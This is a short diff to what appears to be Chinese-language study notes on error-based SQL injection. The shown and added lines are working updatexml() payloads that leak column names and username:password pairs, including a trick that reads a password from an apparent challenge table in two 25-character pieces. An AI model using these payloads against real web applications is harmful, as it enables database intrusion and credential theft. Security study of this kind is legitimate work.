@@ -98,7 +98,10 @@ ord与mid函数同样可以结合在一起使用,与上面类似
 爆字段
 ?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns limit 0,1),0x7e),1)  
 爆字段内容
-?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1),0x7e),1)  
+?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1),0x7e),1) 
+// 一部分一部分的截取
+username=admin’or(updatexml(1,concat(0x7e,(select(left(password,25))from(H4rDsq1)),0x7e),1))%23&password=1
+username=admin’or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))%23&password=1
 ```
 以上说的基本都是查询的时候进行报错注入，有的时候报错注入存在与update、insert语句中
 
